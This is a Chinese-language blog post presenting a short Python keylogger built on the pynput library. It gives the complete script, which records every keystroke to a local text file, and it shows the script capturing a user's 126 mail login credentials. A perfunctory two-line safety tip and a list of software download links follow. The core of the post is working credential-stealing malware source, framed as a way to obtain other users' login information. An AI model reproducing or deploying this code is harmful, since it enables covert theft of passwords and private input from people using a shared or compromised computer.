
--- 
title:  python你TM太皮了——区区30行代码就能记录键盘的一举一动 
tags: []
categories: [] 

---
### 先看看效果

**Like This↓**

<img alt="图片" src="https://img-blog.csdnimg.cn/img_convert/d1ae14c35ebb6f15cae9ae8d3b4a57f8.gif">

### **一、公共WiFi 公用电脑什么的**

在我们日常在线上工作、玩耍时，不论开电脑、登录淘宝、玩网游

统统都会用到键盘输入

在几乎所有网站，例如淘宝、百度、126邮箱等等

为了保护用户信息

登录时，输入框都是不可见的。

但是，输入框都在界面上隐藏，让我们看不到，就能真正的确保万无一失吗？

<img alt="图片" src="https://img-blog.csdnimg.cn/img_convert/16d90f5cb4368a27db5830222a8223af.png">



#### **二、键盘记录器**

今天介绍一种，通过键盘记录的方法，获取用户通过键盘输入的所有信息**。**

**并实现获取126邮箱的登录用户信息。**

<img alt="图片" src="https://img-blog.csdnimg.cn/img_convert/d9c40a17155608f8d58bd340ef1f471b.png">



### **三、python代码实现**



#### **1、安装pynput模块**

```
PS C:\WINDOWS\system32&gt; pip install pynput            Collecting pynput</code>`  Downloading pynput-1.7.2-py2.py3-none-any.whl (99 kB)``     |████████████████████████████████| 99 kB 51 kB/s``Requirement already satisfied: six in d:\python36\lib\site-packages (from pynput) (1.12.0)``Installing collected packages: pynput``Successfully installed pynput-1.7.2`<code>PS C:\WINDOWS\system32&gt;
```

<img alt="图片" src="https://img-blog.csdnimg.cn/img_convert/0b4f5b7e8311f4d6007e3ede387895d0.png">



#### **2、脚本完整代码**

```
# -*- coding:utf-8 -*-  </code>`from pynput.keyboard import Key, Controller,Listener``import time``keyboard = Controller()``keys=[]``def on_press(key):``    string = str(key).replace("'","")`
`def on_release(key):``    global keys``    string = str(key).replace("'","")``    keys.append('\r'+string)``    main_string = "".join(keys)``    print(main_string)``    if len(main_string)&gt;15:``      with open('D:\keys.txt', 'a') as f:``          f.write(main_string)   ``          keys= []    ``with Listener(on_press=on_press,on_release=on_release) as listener:`<code>    listener.join()
```



#### **3、启动脚本**

将脚本放置在电脑的某个路径下，运行该程序；所有的键盘输入，都会被记录在相同目录下的keys.txt文档中。

```
PS D:\test&gt; python .\keyRecord.py
```

<img alt="图片" src="https://img-blog.csdnimg.cn/img_convert/b63d655e70e701345f4f824ec45bd4c3.gif">



#### **4、登录126邮箱 抓取用户信息**



**在脚本运行状态下，登录126邮箱，可以看到，通过键盘输入的信息都被写入到了keys.txt文档中，包括用户名输完之后的tab按钮和确定enter登录按钮**

<img alt="图片" height="466" src="https://img-blog.csdnimg.cn/img_convert/d1ae14c35ebb6f15cae9ae8d3b4a57f8.gif" width="486">



### **四、安全提示**

陌生WiFi不要随便连

陌生电脑不要随便用

emmmm~~~~

###   推荐阅读

#### JDK资源合集
- 【JDK5】jdk1.5x64位 windows版.zip- - 【JDK6】jdk-6u45-windows-x64 jdk1.6 64位 Windows版- - 【JDK7】jdk-7u72-windows-i586-32位- - 【JDK8】jdk-8u131-linux-x64.tar.gz- - 【JDK8】jdk-8u131-linux-x64.tar.gz- 
#### MySql数据库资源
- mysql 5.7 64位安装包 windows版- - mysql5.7 64位安装包 Linux版- 
#### **Oracle数据库补丁合集**
- 【Oracle数据库官方下载】 OPatch补丁工具20.0+版本- 
#### **Oracle客户端工具**
- oracle-instantclient19.6-basic-19.6.0.0.0-1.x86_64 rpm包合集- - Oracle客户端x32位 windows版.zip- 
#### **Oracle数据库合集【Linux+Windows】**
- Oracle10g数据库 Windows32位+Linux32位 合集- - Oracle数据库10gx32位安装包 Linux版+client客户端- - Oracle数据库11gx64位安装包 Linux版- - Oracle数据库11gx64位+Windows版安装包+Oracle客户端+Plsql工具- - Oracle 11G 11.2.0.3 客户端 for windows 64位- - oracle 11g Linux64位安装包- - oracle 11g Linux64位安装包- - Linux版Oracle11g x32位 数据库安装包- - spotlight_for_oracle_rac.5.0.1.1022.zip- - Linux_Oracle客户端全部rpm包- - Oracle12c客户端+plsql12- - **Java实现照片GPS定位【完整脚本】**- - **Python实现照片GPS定位【完整脚本】**- - **女神忘记相册密码 python20行代码打开【完整脚本】**- - ****- 
**python实战**
- ****- ****- **...**- ****- ****- ****
**【pygame开发实战开发30例 完整源码】**
- 
**【pygame游戏开发专栏，获取完整源码+教程】**
- ****- ****- ****- ****- ** **- ****
#### CSDN官方学习推荐 ↓ ↓ ↓
- **CSDN出的Python全栈知识图谱，太强了，推荐给大家！**
<img alt="" height="625" src="https://img-blog.csdnimg.cn/20210607120133619.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjM1MDIxMg==,size_16,color_FFFFFF,t_70" width="351">
